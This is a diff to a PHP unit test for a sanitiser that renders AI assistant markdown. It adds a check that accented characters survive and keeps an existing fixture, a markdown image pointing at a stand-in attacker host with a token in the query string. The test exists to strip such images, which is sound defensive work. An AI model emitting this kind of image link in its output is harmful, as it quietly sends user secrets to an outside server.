@@ -10,10 +10,11 @@ class SafeAssistantMarkdownTest extends TestCase
     public function test_it_removes_markdown_images_without_breaking_links(): void
     {
         $html = app(SafeAssistantMarkdown::class)->toHtml(
-            'Lihat ![secret](https://evil.test/leak.png?data=token) dan [tautan](https://example.com).'
+            'Lihat ![secret](https://evil.test/leak.png?data=token) dan [tautan](https://example.com). Teks ñ é tetap utuh.'
         );
 
         $this->assertStringContainsString('Lihat', $html);
+        $this->assertStringContainsString('Teks ñ é tetap utuh.', $html);
         $this->assertStringContainsString('<a href="https://example.com">tautan</a>', $html);
         $this->assertStringNotContainsString('<img', $html);
         $this->assertStringNotContainsString('https://evil.test', $html);
